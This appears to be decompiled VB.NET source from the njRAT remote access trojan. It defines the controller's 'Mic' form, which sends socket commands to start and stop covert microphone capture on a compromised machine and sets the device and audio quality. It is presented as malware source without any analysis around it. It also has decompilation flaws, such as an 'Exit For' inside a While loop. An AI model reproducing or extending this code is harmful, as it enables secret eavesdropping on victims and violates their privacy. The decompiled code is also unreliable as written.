Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Microsoft.VisualBasic.CompilerServices
Imports NJRAT.My.Resources

Namespace NJRAT
	' Token: 0x0200001A RID: 26
	<DesignerGenerated()>
	Public Partial Class Mic
		Inherits Form

		' Token: 0x060003FE RID: 1022 RVA: 0x0016A0D0 File Offset: 0x001684D0
		<DebuggerNonUserCode()>
		Private Shared Sub __ENCAddToList(value As Object)
			Dim _ENCList As List(Of WeakReference) = Mic.__ENCList
			SyncLock _ENCList
				Dim flag As Boolean = Mic.__ENCList.Count = Mic.__ENCList.Capacity
				If flag Then
					Dim num As Integer = 0
					Dim num2 As Integer = 0
					Dim num3 As Integer = Mic.__ENCList.Count - 1
					Dim num4 As Integer = num2
					While True
						Dim num5 As Integer = num4
						Dim num6 As Integer = num3
						If num5 > num6 Then
							Exit For
						End If
						Dim weakReference As WeakReference = Mic.__ENCList(num4)
						flag = weakReference.IsAlive
						If flag Then
							Dim flag2 As Boolean = num4 <> num
							If flag2 Then
								Mic.__ENCList(num) = Mic.__ENCList(num4)
							End If
							num += 1
						End If
						num4 += 1
					End While
					Mic.__ENCList.RemoveRange(num, Mic.__ENCList.Count - num)
					Mic.__ENCList.Capacity = Mic.__ENCList.Count
				End If
				Mic.__ENCList.Add(New WeakReference(RuntimeHelpers.GetObjectValue(value)))
			End SyncLock
		End Sub

		' Token: 0x17000177 RID: 375
		' (get) Token: 0x06000401 RID: 1025 RVA: 0x0016A6E4 File Offset: 0x00168AE4
		' (set) Token: 0x06000402 RID: 1026 RVA: 0x0016A6FC File Offset: 0x00168AFC
		Friend Overridable Property ComboBox1 As ComboBox
			<DebuggerNonUserCode()>
			Get
				Return Me._ComboBox1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ComboBox)
				Me._ComboBox1 = value
			End Set
		End Property

		' Token: 0x17000178 RID: 376
		' (get) Token: 0x06000403 RID: 1027 RVA: 0x0016A708 File Offset: 0x00168B08
		' (set) Token: 0x06000404 RID: 1028 RVA: 0x0016A720 File Offset: 0x00168B20
		Friend Overridable Property Button1 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button1_Click
				Dim flag As Boolean = Me._Button1 IsNot Nothing
				If flag Then
					RemoveHandler Me._Button1.Click, value2
				End If
				Me._Button1 = value
				flag = (Me._Button1 IsNot Nothing)
				If flag Then
					AddHandler Me._Button1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000179 RID: 377
		' (get) Token: 0x06000405 RID: 1029 RVA: 0x0016A780 File Offset: 0x00168B80
		' (set) Token: 0x06000406 RID: 1030 RVA: 0x0016A798 File Offset: 0x00168B98
		Friend Overridable Property vmethod_4 As Timer
			<DebuggerNonUserCode()>
			Get
				Return Me._vmethod_4
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim value2 As EventHandler = AddressOf Me.vmethod_4_Tick
				Dim flag As Boolean = Me._vmethod_4 IsNot Nothing
				If flag Then
					RemoveHandler Me._vmethod_4.Tick, value2
				End If
				Me._vmethod_4 = value
				flag = (Me._vmethod_4 IsNot Nothing)
				If flag Then
					AddHandler Me._vmethod_4.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x1700017A RID: 378
		' (get) Token: 0x06000407 RID: 1031 RVA: 0x0016A7F8 File Offset: 0x00168BF8
		' (set) Token: 0x06000408 RID: 1032 RVA: 0x0016A810 File Offset: 0x00168C10
		Friend Overridable Property Label1 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label1 = value
			End Set
		End Property

		' Token: 0x1700017B RID: 379
		' (get) Token: 0x06000409 RID: 1033 RVA: 0x0016A81C File Offset: 0x00168C1C
		' (set) Token: 0x0600040A RID: 1034 RVA: 0x0016A834 File Offset: 0x00168C34
		Friend Overridable Property ComboBox2 As ComboBox
			<DebuggerNonUserCode()>
			Get
				Return Me._ComboBox2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ComboBox)
				Me._ComboBox2 = value
			End Set
		End Property

		' Token: 0x1700017C RID: 380
		' (get) Token: 0x0600040B RID: 1035 RVA: 0x0016A840 File Offset: 0x00168C40
		' (set) Token: 0x0600040C RID: 1036 RVA: 0x0016A858 File Offset: 0x00168C58
		Friend Overridable Property ProgressBar1 As ProgressBar
			<DebuggerNonUserCode()>
			Get
				Return Me._ProgressBar1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ProgressBar)
				Me._ProgressBar1 = value
			End Set
		End Property

		' Token: 0x0600040D RID: 1037 RVA: 0x0016A864 File Offset: 0x00168C64
		Public Sub New()
			AddHandler MyBase.FormClosing, AddressOf Me.Mic_FormClosing
			AddHandler MyBase.Load, AddressOf Me.Mic_Load
			Mic.__ENCAddToList(Me)
			Me.QQ = String.Empty
			Me.InitializeComponent()
		End Sub

		' Token: 0x0600040E RID: 1038 RVA: 0x0016A8BC File Offset: 0x00168CBC
		Private Sub Button1_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Operators.CompareString(Me.Button1.Text, "Start", False) = 0
			If flag Then
				Me.Button1.Text = "Stop"
				Me.Button1.Image = Resources.control_pause_blue
				Me.ComboBox1.Enabled = False
				Me.ComboBox2.Enabled = False
				Dim value As Integer = 0
				flag = Me.ComboBox2.Text.Contains("16bit")
				If flag Then
					value = 1
				End If
				Me.sk.Send(String.Concat(New String() { "~", Class7.string_1, Me.ComboBox1.SelectedIndex.ToString(), Class7.string_1, Conversions.ToString(CInt(Math.Round(Math.Round(Conversions.ToDouble(Me.ComboBox2.Text.Split(New Char() { " "c })(0)) * 1024.0)))), Class7.string_1, Conversions.ToString(value) }))
			Else
				Me.sk.Send("~" + Class7.string_1 + "-1")
				Me.Button1.Image = Resources.control_play_blue
				Me.Button1.Text = "Start"
				Me.ComboBox1.Enabled = True
				Me.ComboBox2.Enabled = True
			End If
		End Sub

		' Token: 0x0600040F RID: 1039 RVA: 0x0016AA4C File Offset: 0x00168E4C
		Private Sub Mic_FormClosing(sender As Object, e As FormClosingEventArgs)
			Try
				Dim cn As Boolean = Me.sk.CN
				If cn Then
					Me.sk.Send("~" + Class7.string_1 + "-1")
				End If
				Me.sk.CN = False
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000410 RID: 1040 RVA: 0x0016AACC File Offset: 0x00168ECC
		Private Sub Mic_Load(sender As Object, e As EventArgs)
			Try
				Me.QQ = Conversions.ToString(RuntimeHelpers.GetObjectValue(Class7.smethod_1(Me.osk.L)))
				Me.Text = Class6.smethod_17(0L) + " " + Me.QQ
			Catch ex As Exception
			End Try
			Dim flag As Boolean = Me.ComboBox1.Items.Count = 0
			If flag Then
				Me.Close()
			Else
				Me.Button1.ImageAlign = ContentAlignment.MiddleLeft
				Me.Button1.Image = Resources.control_play_blue
				Me.ComboBox1.SelectedIndex = 0
				flag = (Class7.class8_0.int_1 > Me.ComboBox2.Items.Count - 1)
				If flag Then
					Class7.class8_0.int_1 = 0
				End If
				Me.ComboBox2.SelectedIndex = Class7.class8_0.int_1
				flag = Class7.class8_0.bool_8
				If flag Then
					Me.Button1_Click(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(sender))), e)
				End If
			End If
		End Sub

		' Token: 0x06000411 RID: 1041 RVA: 0x0016AC08 File Offset: 0x00169008
		Private Sub vmethod_4_Tick(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Me.osk Is Nothing Or Me.sk Is Nothing
				If flag Then
					Me.Close()
					Return
				End If
				flag = (Not Me.osk.CN Or Not Me.sk.CN)
				If flag Then
					Me.Close()
				End If
			Catch ex As Exception
			End Try
			Me.ProgressBar1.Value = Me.sk.rp()
		End Sub

		' Token: 0x040001D6 RID: 470
		Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)()

		' Token: 0x040001D8 RID: 472
		<AccessedThroughProperty("ComboBox1")>
		Private _ComboBox1 As ComboBox

		' Token: 0x040001D9 RID: 473
		<AccessedThroughProperty("Button1")>
		Private _Button1 As Button

		' Token: 0x040001DA RID: 474
		<AccessedThroughProperty("vmethod_4")>
		Private _vmethod_4 As Timer

		' Token: 0x040001DB RID: 475
		<AccessedThroughProperty("Label1")>
		Private _Label1 As Label

		' Token: 0x040001DC RID: 476
		<AccessedThroughProperty("ComboBox2")>
		Private _ComboBox2 As ComboBox

		' Token: 0x040001DD RID: 477
		<AccessedThroughProperty("ProgressBar1")>
		Private _ProgressBar1 As ProgressBar

		' Token: 0x040001DE RID: 478
		Public osk As Client

		' Token: 0x040001DF RID: 479
		Public QQ As String

		' Token: 0x040001E0 RID: 480
		Public sk As Client
	End Class
End Namespace
